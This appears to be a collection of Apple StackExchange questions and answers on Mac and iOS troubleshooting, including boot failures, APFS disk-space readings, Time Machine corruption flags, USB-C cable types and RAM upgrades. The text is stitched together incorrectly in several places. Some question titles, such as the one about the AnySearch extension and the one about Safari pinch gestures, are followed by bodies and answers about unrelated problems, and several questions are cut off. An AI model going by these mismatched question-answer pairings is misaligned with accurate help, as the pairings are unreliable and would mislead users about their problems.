my O.S and consequently kernel CPU was flooded. Stopping these and removing a bunch of unneeded kexts seems to have fixed the problem into a functional O.S again. Im unsure if it was only those two kexts or other removed kexts that ultimately fixed the problem, but at least this gives you an idea of what to do if you have the same problem.\nResources:\nosxdaily.com/2011/-3/08/remove-an-agent-from-launchd\netrecheck.com\nResult:\nMy bootup time became faster but seemingly not yet back to pre-problem speed.\nHowever, the O.S is now completely functional again, with idle CPU kernal usage down to minimal and user CPU usage available again.\n\nOriginally accepted answer: \n\nstrangely enough, i used my windows boot for a few days, and even did\n  a windows update, then i tried to boot Mac again and its working\n  mostly fine now, it still took a bit slower to boot (but not 20\n  minutes like it was doing before), and the decrypting is not even\n  finished now. So apart from not using the volume for a few days, i\n  have no idea why it is now working seemingly well again. Id suggest if\n  you have a similar problem to look at the links i've posted in the\n  question details. Perhaps just accessing the boot sector with Windows\n  helped fix up some files or perhaps it was the last First Aid i was\n  manage to do which didnt immediately fix it but mayve fixed it but\n  took a few boots for me to realise. its also possible the problem is\n  not fully fixed and will return but im offering this as the answer for\n  now.\n\n", "Q: How to delete \"invisible\" files/folders (device backups) I am trying to recover about 162 GB of drive space by deleting device backups from ~/Library/Application Support/MobileSync/Backup on a MBP running El Capitan (10.11.6.) To be safe I dragged the Backup folder to a folder I created on a NAS, thinking this would simply copy the folder and its contents over. Instead the folder disappeared from the local drive and was nowhere to be found on the NAS.\nI think I understand why the drag operation failed without warning*. But the problem I face now is that I have no way to reference the Backup folder in order to actually delete it. Thus 162 GB are occupied with apparently no way for me to free them up. With about 2 GB of free space on that system drive the machine is crawling.\nAny thoughts on how I might free up that space without reformatting the drive would be much appreciated.\n*This NAS holds Time Machine backups of two MPBs, as well as a couple of shares used for temporary backup storage. If memory serves, rather than mounting the share properly, and accessing it in Finder from the Shared or Devices section of the sidebar to set the drag destination, I created a folder, possibly inside the folder containing the TM backup, and used that as the drag destination. The \"copy\" was instantaneous (a dead giveaway that something was wrong), and then I later could not find the folder I had created, nor the Backup folder I had copied. Dumb mistake, likely due to sleep deprivation, or lame human multitasking.\n\nA: The fact that the copy was instant would lead me to believe that the source drive and destination drive are the same. So I'm guessing that the Backup folder is actually somewhere on the MBP drive.\nYou could open terminal and do something like\nsudo find ~ -name \"3d0d7e5fb2ce288813306e4d4636395e047a3d28\"\nThat would search your home folder for the backup file for the sms database. I just picked a random backup file that everyone should have :) as a way of looking for iTunes backups. I limited to the home folder try to speed up the search, but you could do\nsudo find / -name \"3d0d7e5fb2ce288813306e4d4636395e047a3d28\"\nand walk away and give it some time. Or keep subbing out different search locations like /Library, etc.\nFuture compatibility note: The different file permissions in macOS Mojave would likely prevent this from working. But in El Cap I think it should work.\n", "Q: How to operate an iPad from a Mac or Windows PC? I have a setup in office where on a desk is a fixed iPad on a stand. On the same desk, I have a Windows PC or iMac.\nCustomer  is looking at iPad. I am the desktop user and I want to control the iPad from my desktop to demo a website. Customer looking at iPad should not see any part of my desktop other than the website. Since the stand secures the ipad and hides home button on the iPad, I want to be able to access the Home button from my desktop to wake up iPad from sleeping. \nWhat is the solution for above? \n\nA: You cannot wake an iPad with standard software from the desktop. You'll have to use one of the iPad models that support Tap to Wake instead (i.e. they can be woken up by touching the screen, and/or for some models by using the Apple Pencil on the screen).\nFor demoing the webpage you can use the Safari Web Inspector. On the iOS device you'll need to access System Settings => Safari => Advanced and then enable \"Web Inspector\".\nConnect the iPad to your iMac and open Safari on the iMac. From the desktop Safari's Preferences, you'll need to enable \"Show Develop menu in menu bar\" in the Advanced tab.\nNow you'll have a Develop menu in Safari where iPad has its own submenu. When you open Safari on the iPad, you can choose it from that menu - and you have various tools at your fingertips. For example you can highlight elements on the page using the element finder, or you can navigate to other pages, run Javascript code, or whatever you would like.\nThe above works because your use case is specifically to demo a web site. There's no generic solution for remotely controlling the iPad across the wake screen, home screen, built-in apps, third party, apps, etc. Solutions exists that allow you to see the contents of the screen (for example using Quicktime to record on the iMac, or using third party solutions such as TeamViewer). However, none of those allow you to remotely control the iPad.\nIt is possible to integrate remote control in specific apps, but it requires you to be able to modify the app - so it is in practice only an option for the app developer.\n", "Q: Is AnySearch browser extension from Apple's Extension Gallery malware?

I pulled the drive and checked it (backed up, SMART status passed, 70+ MBps read/write - pretty good for an old 2.5\" spinner). I booted to AHT and ran full hardware diagnostics. It came back with no errors. I know that HDD cables in these machines fail regularly, so I replaced the cable with a used one I bought from PowerbookMedic.com. It worked!\nAbout a week later, the exact same thing happened - a flashing question mark on waking from sleep. So my question is:\nCould a different piece of hardware be failing/did I overlook something? If so, what? If not, what are the chances that this new cable failed so soon after install? More importantly, if I exchange it for another used cable, what are the odds it will fail quickly again?\nImportant notes:\n\n\n*\n\n*HDD is known good\n\n*Once the flashing question mark folder shows up the first time, nothing will boot attached to that cable (attempted with Win10 SSD, macOS HDD, multiple attempts made - the first time this occurred, a cable replacement solved that issue).\n\n*Computer will still boot and operate effectively from HDD when attached via USB\n\n\nPlease don't hesitate to ask any clarifying questions!\n\nA: Looks like it was just bad luck.

To check if your passwords are there, check all of the following:\n\n\n*\n\n*On iOS: Settings > Passwords & Accounts > Website & App Passwords\n\n*On macOS: go to Keychain Access (/Applications/Utilties/Keychain\\ Access), and on the sidebar to the left, there should be an entry called iCloud towards the top.

Since switching to APFS I noticed that df delivers strange results.\nFor example:\n$ df -h /\nFilesystem     Size   Used  Avail Capacity iused               ifree %iused  Mounted on\n/dev/disk1s1  466Gi  401Gi   62Gi    87% 3165852 9223372036851609955    0%   /\n\nIt seems that I have only 62GB free (disk at 87%)\n\"About this Mac\" gives a completely different picture\n\nWith 177 GB free. \nWhich is more reliable? Is df still working on AFPS?\n\nA: I don't think this is a question of \"reliability\", it is simply that the two programs display different things. \"Free space\" sounds simple, but in reality it is quite complex - different people, different systems, etc. all consider \"free space\" to be different things.\nFor example \"free space\" could mean \"how much of the disk space is not currently used for any meaningful data\", or it could mean \"how much more data can I store here\" or something completely different.\nThe \"About this Mac\" tries to take the latter approach. If I add more things to this disk, how much can I really add. Technically it involves the calculation taking into account things that are temporary in nature. Often the largest differences here comes from local TimeMachine snapshots (they're created on the source volume, not the backup disk). These are temporary and will be removed automatically. \nIn contrast, df takes a very \"technical\" approach and shows the \"raw\" file system information according to how much of the disk space isn't used for anything meaningful. I.e. even for example temporary TimeMachine snapshots are included in \"used\" as they're actually storing useful data.\n\nA: With APFS, it seems that the \"slices\" aren't really in separate partitions.  Here's what mine shows:\nWGroleau@MBP ~ % df -g\nFilesystem     1G-blocks Used Available Capacity iused      ifree %iused  Mounted on\n/dev/disk1s1s1       931   13       119    11%  563932 9767414228    0%   /\ndevfs                  0    0         0   100%     662          0  100%   /dev\n/dev/disk1s5         931    2       119     2%       4 9767978156    0%   /System/Volumes/VM\n/dev/disk1s3         931    0       119     1%     788 9767977372    0%   /System/Volumes/Preboot\n/dev/disk1s6         931    0       119     1%      18 9767978142    0%   /System/Volumes/Update\n/dev/disk1s2         931  794       119    87% 3003929 9764974231    0%   /System/Volumes/Data\nmap auto_home          0    0         0   100%       0          0  100%   /System/Volumes/Data/home\n\nNotice that the capacities for disk1 slices add up to 102%.  And they all differ.  But the total size and amount used is the same for all—and 931 GB is about right for the entire one terabyte SSD.\nSo, instead of looking at the capacity column, I should compute 119/931=12.8% free (87.2% used).\n", "Q: Can I disable pinch to show all open tabs in Safari?

My organisation's people use a mixture of Apple Mail and Gmail.com as a client for our Gmail addresses. We use a GSuite app to set peoples' Gmail signatures, which works great for those sending email from Gmail.com, but the signature is not 'imported' by Apple Mail. This means people have to manually copy their Gmail signature into the Apple Mail signature preferences. Is there any way to remedy this?\nI understand that this may not be a shortcoming of Apple Mail, but a shortcoming of Gmail.\n\nA: I ended up using Outlook Desktop as it allows me to copy/paste the GSuite signature. \nWith the Apple Mail is a pain to resize the images and you just cannot float them. \nI opened a tread on Apple Community: https://discussions.apple.com/thread/250552009 and I hope to receive a reply. \nBut I believe there is no easy way out.

I  replaced the optical drive with a hard drive and everything worked fine. \nRecently, I replaced the old hard drive in the optical bay with a new HP 128GB SSD.

I tried to click anything in Disk Utility and it continues to hang again. \nI am about to pull it apart in frustration and format the darn thing with my clone cable. What could be causing the hanging and how should I format it if I am only storing code?\n\nA: The \"hang\" is most likely caused by the HP SSD being pre-formatted for Windows computers (NTFS) which macOS cannot read by default.  If you wipe the drive with a macOS compatible format, it will likely fix the issue.\nUsing Terminal, issue the following command:\n$ diskutil eraseDisk HFS+ Untitled GPT /dev/diskX\n\n\n\n*\n\n*HFS+ is the format of the new drive\n\n*Untitled is the name of the new drive\n\n*GPT is the partition scheme\n\n*/dev/diskX is the drive identifier (use diskutil list to obtain identifier)\n\n", "Q: Is there a vimari or vimium port for safari on mojave?

However, after I've gone through and set the folder location to my USB's music folder, about 2,000 of my more recently downloaded songs have gone missing. Choosing to use a song's location to determine the location of other songs just tells me it can't locate any of the missing songs, even though all albums are in their own folder with all the files either named \"1-01 song name, 1-02 song name etc.\" or \"1 song name, 2 song name etc.\".\nI could go through and manually locate all of them, but I just can't do that when there are almost 2,000 songs missing.

The problem is that it keeps crashing in the middle of backups, then forcing a complete disk scan, which takes a really long time, so it never gets to complete a new snapshot.\nTo try to make progress, I created an external bootable drive, which I can use to get the laptop started.  I can also mount my Time Machine backup drive - both are external USB drives.  I was hoping to tell Time Machine to resume backing up the laptop's internal drive to the Time Machine drive, but I don't see any obvious way to do that.\nIs there some way I'm missing?  Maybe using tmutil from the command line?\n\nA: Time Machine is optimized to create and maintain a history of file-level backups of all files/folders on your system. What you rather need is a disk/image level backup which just dumps the whole drive onto an external drive. You can afterwards either copy the whole image back again or, probably more useful, get specific folders back.\nThe two applications people tend to use for this are CCC and SuperDuper!. You also need an additional external USB drive at least as big as your internal drive.\n", "Q: Is it possible to put a header column on the right of a table in Pages?

Is there an option to make a header column (footer column?) on the right side of a table?\n\nA: I did not think this would actually work.\nApparently, if you switch to a RTL language before inserting a table, it automatically orients it right-to-left instead of the default left-to-right.\nIt's annoying that this doesn't help for tables already created, but I'll take what I can get.\n", "Q: Can you use a Thunderbolt 3 cable to connect two Macbook 12-inch in target disk mode? I'm working as a technician and would like to learn the capabilities of these cables.\nI know a USB-C 3.1 gen. 2 can do it, but I'd like to know if a Thunderbolt-3 cable would do it.\nI know that you cannot use the thunderbolt 3 cable to connect a Macbook 12-inch to a Mac with Thunderbolt-3 port, as Thunderbolt ports seem to only accept Thunderbolt cables for data transfer (and I tried to and didn't work).\nCan you use a Thunderbolt 3 cable to connect two Macbook 12-inch in target disk mode?\n\nA: The Macbooks connector is only USB-C (USB 3.1 Gen 1), which is not Thunderbolt 3. \n\n\n*\n\n*You can't connect in target disk mode via a thunderbolt 3 cable.\n\n*You can use USB-C data cable to connect in USB target disk mode. \n\n\n(Not that this helps, but the Macbook Pro has native thunderbolt 3 support, and would work in this manner.)\nYou also can use migration assistant over ethernet if you have a usb-c ethernet on both ends or WiFi, if moving accounts is your ultimate goal.\n\nA: \nCan you use a Thunderbolt 3 cable to connect two Macbook 12-inch in target disk mode?\n\nThere's two kinds of Thunderbolt cables, active and passive.  There's two kinds of USB-C to USB-C cables generally, active and passive.\nPassive Thunderbolt 3 cables will be no longer than about 0.7 meters.  These are relatively inexpensive and because they are passive they will always work as USB cables.  Active Thunderbolt 3 cables will be longer (because the only reason to make them active is to overcome the length limit), they will be more expensive than other USB-C to USB-C cables (because there are expensive electronics in the cable), and may or may not work with USB hosts and devices (because the Thunderbolt spec only requires Thunderbolt hosts to support USB, it's optional for cables and devices).\nThe USB-C spec requires that the supported protocol be indicated on the cable ends with some kind of icon and/or text.  It's unfortunately common for USB-C to USB-C cables to have no markings, which does not mean they will not work as Thunderbolt or USB 3.x cables but means they were not tested to meet the spec.\nOne \"rule of thumb\" on USB-C cables is to simply assume they are passive unless there are some markings to indicate otherwise.  A passive USB-C cable under 0.7 meters is likely to support 40 Gbps USB4 and Thunderbolt.  If it has the Thunderbolt icon on the cable connectors then it's been tested to support 40 Gbps USB4 and Thunderbolt, and because the cable is passive it will work with any other protocol up to 40 Gbps.\nA passive USB-C cable that is a meter or less in length will likely support 5 Gbps USB 3.0, 10 Gbps USB 3.1, and 20 Gbps USB 3.2.  The cables all had to meet the same spec to comply with USB 3.0, 3.1, and 3.2, the increase in speed is from increasing efficiency in how they used the wiring in the same cables.  Again if there are USB markings then the cable has been tested to meet the spec, the stylized \"SS\" icon will indicate support for 5 Gbps and there will be a small 10 or 20 on the connector if tested for the higher data rates.  Also by being passive they will work as DisplayPort cables or any other protocol used by USB-C and does not exceed the data rate supported by the cable.\nPassive USB-C cables over a meter in length will only support USB 2.0 speeds, the \"super speed\" data wires will not be present in these cables.  Again it's far too common for USB-C cables to lack proper markings so expect inexpensive USB 2.0 cables to lack markings and expensive active cables (with the \"super speed\" data wires) to have the correct markings.  If someone is going to sell an $80 active Thunderbolt cable then they are not likely to go cheap and not put the little Thunderbolt icon on the connectors.\nThere is no rule of thumb on active USB-C to USB-C cables, the data rates and protocols they support is all on the electronics in the cables.  Some active Thunderbolt cables will advertise backward compatibility with USB 3.x, others will explicitly state they don't have backward compatibility, and some will leave you guessing.\nLet me see if I can summarize all this in one short paragraph.  All passive Thunderbolt 3 cables will support USB 3.x.  All Thunderbolt hosts will support USB 3.x devices.  Some Thunderbolt devices and some active Thunderbolt cables will support USB 3.x.  All cables that meet the USB-C spec will mark the connectors for the protocol and data rate they support.  A lack of markings means they might work with Thunderbolt or USB 3.x, or they might not, most likely these will be USB 2.0 cables and only really useful for low data rates and battery charging.\nI hope that helps.\n", "Q: my magic mouse is sluggish and hangs sometime when I try to move it I have 2 Magic Mice, Mouses.whatever.. One runs on 2 AA batteries and the other one is rechargeable. I use the 2-AA one when I'm recharging the other.\nRecently the rechargeable mouse has started functioning strangely. The movement is jumpy and it seems to stick at times. It's hard to do fine movements. I cleaned the visible sensor used for tracking but it had no effect. If I switch to my old 2 battery mouse it works fine. What can cause one Bluetooth mouse to work and another one not? They both worked fine about a week ago when I had to charge one.\nDo the System Preferences settings apply for any mouse being used or are they mouse-specific. \n\nA: There is a known problem with Bluetooth being interfered with by WiFi and especially by USB3 devices.

Schwa is made exactly the way that article and you describe.  \nThe results you are getting are what happens when you are actually using a different input source, such as US or US International PC.  Make sure that the \"flag\" menu at the top right of the screen says ABC Extended. \nNote that selecting an item in System Preferences > Keyboard > Input Sources does not do anything, you need to have the keyboard you want shown in the menu bar, where you can also actually set them.\nIf you prefer to switch keyboards without using the \"flag\" menu, you can set a keyboard shortcut for this in System Preferences > Keyboard > Shortcuts > Input Sources.\n", "Q: Do macOS default preferences ever have breaking changes (the ones we edit with defaults command)? I have a script that uses the defaults command to set a bunch of preferences.\nI am curious, do these preferences ever have breaking changes (f.e. when I update macOS), so that I need to modify my script?\nIf so, where can I find a list of breaking changes?\n\nA: Like any part of the OS, Apple can change or modify the preference keys. Anecdotally, I can certainly remember people commenting that some keys have been removed, so that setting a particular preference no longer works. \nFor instance, Apple changed PMPrintingExpandedStateForPrint to PMPrintingExpandedStateForPrint2 at some point. This is the key that specified whether the print dialog is expanded or simplified.\nAs mentioned on this site before, Apple does not document many of the available keys; most of which have been found by inquisitive people searching for text strings in executables. So a list of changes seems unlikely.\nThe defaults write command does not check for validity. So I can add the key IamFabulous -bool true to Preview's plist, and it will sit there doing nothing. Preview will never check for the value of that key.

Disk Utility reports the drive as \"SATA Internal Physical Volume - Mac OS Extended (Journaled)\". I ran First Aid on it and it came back good.\nI have a 500GB SSD in a USB enclosure.\nI booted into Recovery and started Disk Utility. I erased the SSD and chose plain APFS format (the four options available are all APFS variations). I tried restoring to the SSD, but the Restore window shows \"None Available\" in the \"Restore from:\" drop-down.\nI read something that suggested converting the boot disk to APFS, but that menu item is grayed out when I select that drive.\nHow can I get the contents of this spinning hard drive onto the SSD?\n\nA: While the only format options available for the new drive were APFS variations, after formatting I was able to use the Partition tool in Disk Utility to morph the new drive into \"Mac OS Extended (Journaled)\". Once the format type matched between the two drives I was able to restore from the existing system drive onto the new SSD.\n\nA: You can only make a diskcopy with DiskUtility from a drive that isn't the startupdisk. So you probably need to make 2 partitions om the SSD. One to mount from (small) and one to accept the diskcopy data that you can make from the internal Sata drive. Don't know if DiskUtility will play along because both drives are the same size, and then the Sata data won't fit on the 2nd SSD partition. But you should boot from another volume than the SATA disk to make a copy from that. Otherwise you get the popup \"disk in use\", like i got when i made a diskcopy to icloud(!)... that is also possible!\n", "Q: Finding stolen AirPods I recently had my AirPods stolen from my bag at college. Soon after, I attempted to locate them using the Find My iPhone app but was unsuccessful in doing so. The AirPods appeared grey in the app and only showed the last location I know I opened them.\nSince then, I have repeatedly checked the app, but the location has not been updated since. Unlike other Apple devices, it appears that there is no option to 'lock' the device as there is for iPhones within the app. It has been difficult to work around the problem.  \nAfter talking to other people, it has come to my attention that it may have been possible for the person to have reset the AirPods after taking them and this is why I am unable to locate them.\nI would be extremely appreciative if someone could give me advice on a course of action recovering the AirPods using the Find My iPhone app. I have already talked to the staff at my college but there is very little they can do which is why I'm hoping I can locate the AirPods myself.\n\nA: AirPods only note their location in Find My iPhone when they pair with your device. They have no built in location tracker and no way to communicate to the internet except through your paired iPhone or iPad or Apple Watch. \nThe person may have reset them, but even if they didn't you wouldn't get any location updates unless the thief walked by and remained in range of your device long enough for the AirPods to pair. \nThe reset doesn't change the identity of the bluetooth module so that may have nothing to do with locating them, either.\n", "Q: MacBook chargers turns green, then red, and then stops charger I have been using a MacBook charger for about 6 months, and now I tried to use another one which I have used before with this MacBook. \nNow, the battery is low enough that the MacBook can’t start, but only display the battery icon on the screen.\nWhen connecting it to the power, the charger led turns green, then red (signaling that it is charging) and finally, turns off (after about 15 seconds). \nI tried cooling down the MacBook and the charger, and after that I tried recharging. It did work for a longer time, but then the behavior explained above appeared again.\nWhy is this happening? How can I fix it?\n\nThe other charger does work. This charger stops working once the MacBook is started (or woke up from sleep).\n\nA: If one charger works, and another doesn’t, the non-working one is most probably broken and needs to be replaced. \n", "Q: How Does Time Machine Check for \"Runtime Corruption\" and How Do I Reset It? After working quite happily for months, Time Machine running with a NAS as a backup destination has suddenly decided that my backup is \"corrupt\" after failing a check for \"runtime corruption\" and is insisting that I must delete the entire (4 terabyte) backup and start again!\nWhat I want to know is how Time Machine determines \"runtime corruption\", and can I in some way reset or disable this check?\nI have already checked the disk image itself using the following commands:\nhdiutil attach -nomount /Volumes/Path/To/Backup.sparsebundle\ndiskutil verifyDisk diskN\ndiskutil verifyVolume diskNs2\n\nSubstituting paths and disk numbers where appropriate, and have found no errors whatsoever. So what exactly is Time Machine checking?\nI've also checked almost all of the most recent backup (using shasum, ignoring files with newer modified times) and everything is fine; I can't find any evidence that anything is corrupted in any way, certainly not any of the files I care about most.\nIt's laughable really, as the only processes to touch the bundle are Time Machine and related components, there has been no sign of any kind of network connectivity issue, no other errors in the logs, and every other backup for the same day was completed without issue. Which means that any \"runtime corruption\" is most likely the fault of Time Machine itself!\nIt's also even more ridiculous that the only option presented is to wipe everything, rather than perform a deep traversal to compare the contents in detail (to find anything that may indeed be corrupted and replace it, not that I believe there is any corruption at all).\nI don't want to have to discard 4 terabytes of backups for some vague, unspecified \"corruption\" that doesn't even appear to exist, so is there some way I can remove whatever data Time Machine is using to detect its mythical \"runtime corruption\" (a check it doesn't even appear to do with direct attached drives) so that I can just continue backing up?\nEDIT:\nSo I've gained some new information, which is that the Time Machine \"runtime corruption\" check is actually just running fsck_hfs -q, which has nothing to do with corruption whatsoever, it is merely a test of whether a disk image was unmounted \"uncleanly\", which is no guarantee of corruption (as I have already confirmed).\nUnfortunately despite managing to clear the \"inconsistent\" bit (which indicates an unclean unmount) using fsck_hfs -p time machine is still refusing to use this backup, despite the runtime corruption check no longer failing. Meaning some other data must be stored somewhere.\n\nA: I've now discovered a complete solution by (carefully) following these steps:\n\n*\n\n*Turn off Time Machine's automatic backups in the Time Machine preference pane (to prevent any conflicts).\n\n*First mount the network volume to which Time Machine is backing up, how to do this will depend upon your system, there should be a disk image in there named after your computer (e.g- for a system named \"Haravikk's Mac Mini\" you'll find \"Haravikk's Mac Mini.sparsebundle\"\n\n*Attach the image using the following command in Terminal.app: hdiutil attach -readwrite -nomount /path/to/image (you can fill in the path by dragging onto a terminal window from the finder, just make sure there's a space after -nomount).\n\n*Take a note of the device numbers returned, one of these will be your backup volume, usually the last one in the form of diskNs2 where N is the disk number, and the s2 should be the partition.\n\n*Run the following command, taking note to add r to the start of the device number to connect to the \"raw\" (unbuffered) device: fsck_hfs -p /dev/rdiskNs2\n\n*Wait for the check to finish; if it finds any errors it should attempt to fix them then run again automatically, wait for the process to finish. If it reports there were errors that could not be fixed then you should consider discarding the backups as recommended, or else run the command again with -f instead of -p (though this is not recommended).\n\n*At this point you should really check that your latest backup isn't corrupt; you can do this visually by mounting the image (diskutil mount diskNs2 substituting as appropriate) and examining in the Finder. A more detailed comparison is recommended however but beyond the scope of this answer.\n\n*Detach the disk image with the following command (substituting disk ID): hdiutil detach diskN (if you mounted the image above, \"eject\" it first).\n\n*In the Finder open the the folder with your backup disk image, right-click it and choose \"Show Contents\". Inside you'll find a file called com.apple.TimeMachine.MachineID.plist, open it. If you have Xcode installed it will open in this, otherwise you should be able to open it in TextEdit; when editing in TextEdit you'll need to have some familiarity with XML and plist files, though they're pretty straightforward.\n\n*Find the VerificationState key and change its value to 1 (it will probably be set to 2 if you're experiencing the same issue as me).\n\n*Find the RecoveryBackupDeclinedDate key and delete it, if you're using TextEdit make sure you also delete its <date> value.\n\n*Save your changes, unmount the network volume and re-enable Time Machine's automatic backups.\n\n*Either wait for the next backup, or run one immediately; if your network destination isn't your only backup device you can trigger a backup to it in the Time Machine preference pane by right-clicking on the destination's icon and choosing \"Back up to  now\".\n\nDetails\nIt seems that Time Machine's \"runtime corruption\" check is a call to a fsck_hfs -q, which checks whether a volume was unmounted uncleanly. If this fails, the volume will have an \"inconsistent\" bit set against it that can only be cleared by successfully repairing it using fsck_hfs -p or similar.\nHowever, in addition to this Time Machine stores a \"corrupt\" status in its com.apple.TimeMachine.MachineID.plist within the disk image bundle. I'm kicking myself for not finding this sooner since it's right there just inside it. I'm not sure if Time Machine performs any additional checks, there is a key related to some kind of extended check, but I'm not sure exactly what this entails.\nCorrecting both restores the image to \"normal\" status, allowing Time Machine to run without issue.\nNOTE: While in my case the \"runtime corruption\" check was definitely mistaken, it is important that you check whether there is any actual corruption to ensure this is the case. It's a bit beyond the scope of this answer to cover that as well, but if anyone would like to recommend tools or guides for doing so please comment!\nExtra\nI ended up finding these solutions myself despite trying to get help from Apple engineers; they just wasted my time trying to find ways to blame me for the fault, rather than telling me what I needed to know, and they've gone and closed my bug report despite my having shown them exactly how I verified no corruption had occurred!\nVery, very disappointed with Apple's handling of a report that their flagship backup tool may be deleting users' backups unnecessarily. I'm now seriously considering ditching Time Machine entirely next time I upgrade my storage, as I'm no longer confident I can trust it, or the engineers who work on it, and may go for the overkill option of something based on ZFS send.\n\nA: After following the instructions, I wasn't able to run fsck_hfs because I lacked permissions, even as root. The fsck only ran after changing the sparsebundle's permissions and mounting it with readwrite access\nchflags -R nouchg /Volumes/xyz.sparsebundle\nhdiutil attach -nomount -readwrite /Volumes/xyz.sparsebundle\n\n\nA: I had this once, I deleted the drive from the Time Machine settings and added it again. Your system will then check everything and make a new backup.\n", "Q: Unable to access phone after update to iOS 12.1.4 I recently updated my iPhone 5S to iOS 12.1.4 and I can't access it anymore.

After I tried 2 different cables which have been working previously, and making sure the USB input was working, the phone would not be detected by the computer itself.\n\n\nCan somebody help me?\n\nA: Connect your iPhone to iTunes\n\nIf iPhone is locked, iTunes will not recognize that it's connected.\n\nTherefore, you have to put your iPhone to DFU mode. Usually, a key combination is used to do that (requires home button).\nOther way is to use third party software, which allows you to enter DFU mode with one click.\n\n\n*\n\n*Recboot\n\n*Tiny Umbrella\n\n*Redsn0w\n\nI have not checked, whether second and third option works with your iOS and iPhone, but there are a few others worth trying.\n\nWhen your iPhone enters DFU mode, you will be able to manually reinstall iOS using iTunes or recover from backup.\n\nA: I think broken home button is the source of the problem. \nI think below can be a solution. \n\n\n*\n\n*Get an external home button like this. But I do not know this product also works for your iPhone 5S. There are similar cases like yours.

I would prefer an option that doesn't wipe all my data.\n\nUpdate:\nThe article is referring to the Storage tab from About This Mac.\n\nSo does this mean my drive is fine? I just need to continue clearing up more stuff?\n\nA: Note that the article says \"in the Finder\". Disk Utility shows you more detailed information, because it's ... well... Disk Utility. The Fusion logical volume is stored within a \"container\" data structure. You may see more information if you have checked \"Show All Devices\" in the View menu.\nA fusion drive is usually made of 1Tb mechanical drive with a 120Gb SSD. If your Fusion drive had \"split\", you would see two separate volumes on the Desktop.\n(Oh, and you wouldn't have a working system, as both volumes would be unreadable and all your data would be lost!)\n\nA: \nShould I follow the steps in the support article to merge the drives\n  back? Would prefer an option that doesn't wipe all my data.\n\nNo!  Don't do this! Your Fusion Drive hasn't split!\nI believe you're confusing two issues: running out of application memory and your fusion drive becoming disassociated.\nAs for the first issue, see the post “Your system has run out of application memory. How is that possible?” for further details, but to summarize it, you've run out of RAM and swap space on your drive.\nA Fusion drive is nothing more than Apple's incarnation of what the industry calls a hybrid drive.  Basically, you're combining an Solid State Drive (SSD) with a Hard Disk Drive (HDD) to get the advantages of the SSD, but with the affordability of the traditional hard drive.\nWhat you're seeing in Disk Utility is the Fusion Drive (Apple doesn't show the individual physical drives there), the APFS container and then the \"Macintosh HD\" partition within that container.   \nIf you issue the command (in Terminal) diskutil list, you should see at least 3 entries - disk0, disk1, and disk2 - the SSD, the HDD, and the combined Fusion Drive.\nLooking at disk2 you'll see something similar to below.

I have rebooted my Mac and my iPhone multiple times since then to no avail.\nOther devices (an iPod Touch, two different iPads) synchronize just fine to the same computer, and my photos are able to transfer from this iPhone to Photos as well.\nAny idea what's going on and how I can fix it?\nThere are several threads about this on the Apple discussion forum, but all of them have gone unanswered for many years.\n\nA: This appears to be a bug with current versions of iTunes, and may be fixed in the future.\nIn the meantime, a workaround which sometimes works:\n\n\n*\n\n*Disable \"automatically sync this phone when connected\"\n\n*Turn off music synchronization, and click \"remove\" when it asks you if you really want to stop synchronizing to this library\n\n*Sync the phone manually\n\n*Turn music synchronization back on, and then click \"remove and sync\" when it asks you what to do.\n\n*Sync the phone manually\n\n\nAfter this point the library seems to be repaired and it starts to sync again, at least for a little while.\nUPDATE: This technique stopped working for me (or rather, it failed to work; thanks, confirmation bias). However, doing a backup of my phone, and then restoring it from that backup, usually works. Eventually.\n", "Q: How to disable service workers in Safari?

Safari Preferences > \"Advanced\" pref pane > \"Show Develop menu in menu bar\" checkbox at the bottom.\nThen, in Develop menu, go to \"Experimental Features\" menu item and disable \"Service Workers\" in the sub menu.\n\n", "Q: Does Universal clipboard works on ethernet? I have a mac mini 2018 connected to the same router/network, but using ethernet cable, and iOS device, connected to the same router/network, but using wifi.\nBut i can't use universal clipboard to paste text from ios to mac and vice versa. Should i connect my mac mini to the same network via wifi only in order to get it work?\n\nA: I had to turn off / on handoff on ios (or restart it), then it worked. So it works even without wifi on the mac, you only need to have bluetooth on and being connected to the same router.\n", "Q: Use Shortcuts app to format text I have text in this format:\nRed and green apples\nPear\n2 Bananas\nred orange\nMelon\nGrape fruit\n\nI need it in this format:\nc(\"Red and green apples\", \"Pear\", \"2 Bananas\", \"red orange\", \"Melon\", \"Grape fruit\")\n\nI also have these numbers:\n1\n172\n3\n183\n16\n178\n68\n56\n687\n576\n455\n\nWhich I need in the format below.

For all this long it was running fine when lately I thought to add more RAM. So yesterday I added 2 more 8GB RAM modules and as I turned the system on it starts running to slow. \nApps which were running smooth earlier are now running too slow. \nOn Civilization VI i can practically see every frame moving every second, which earlier was running very fine. \nOld config RAM\n\n\n*\n\n*Slot 1 from bottom 4GB - system default RAM\n\n*Slot 3 from bottom 8GB - Hyper Kingston 1867 DDR3 RAM SODIMM\n\n\nNow added RAM\n\n\n*\n\n*Slot 2 from bottom 8GB - Hyper Kingston 1867 DDR3 RAM SODIMM\n\n*Slot 4 from bottom 8GB - Hyper Kingston 1867 DDR3 RAM SODIMM\n\n\nA: You should have matching DIMMS in order to maximize performance / dual channel functionality.  Also note that RAM is going to operate at the lowest speed of all the DIMMS, which is another reason why they should all match.  \nThat being said, it shouldn't be operating that slowly.  I would start with removing the original 4 GB stick, possibly doing a PRAM reset, and maybe shuffling around which slots they're installed in, since the problem only starting showing when you used the two vacant slots with the new RAM, if I'm reading correctly. Also confirm that the system is recognizing all the memory you installed.\nFinally, it's possible you got bad/defective memory.  You can also try running diagnostics to rule out logic board issues etc.\n\nA: I wouldn’t add memory to a system unless and until the memory pressure runs into the yellow or worse. More parts means more chance of failure, less chance that good compression and swap happen.\nIn fact, we’re seeing the same thing on 2017 iMac and newer in production. We get Apple NVMe SSD and they are so fast, the stock 8 GB of RAM is faster in almost all cases than bumping up to 16 or 32 GB of RAM.\nThere are some very limited cases where you need more memory, but generally, you want to not run web browsers and other buggy / leaky code and adding more RAM just gives them more room to make a bigger mess before you clean them up.\nEven Photoshop and Illustrator - crank their undo buffers down to an accurate size for the needs instead of giving them 8 GB of RAM for scratch so they keep around undo from 4 hours ago.\nThese days, the performance bottleneck is almost in order:\n\n\n*\n\n*The human\n\n*The human not cleaning up software (think 50+ browser tabs, with all sorts of JavaScript trackers running in each tab, web apps, node apps, electron apps, etc..)\n\n*Just bad software (things that take CPU in the background, constantly wait for network tracking and can’t work offline or communicate only when there’s something to do)\n\n*Network slow\n\n*Server slow (SMB / local servers)\n\n*Storage slow (especially non SSD / non NVMe storage)\n\n*Maybe now you might need a CPU bump or some more RAM - but maybe not, so measure before and after to change setup.\n\n", "Q: iCloud Disassociation for a Mac Computer I had a Mid-2012 MacBook 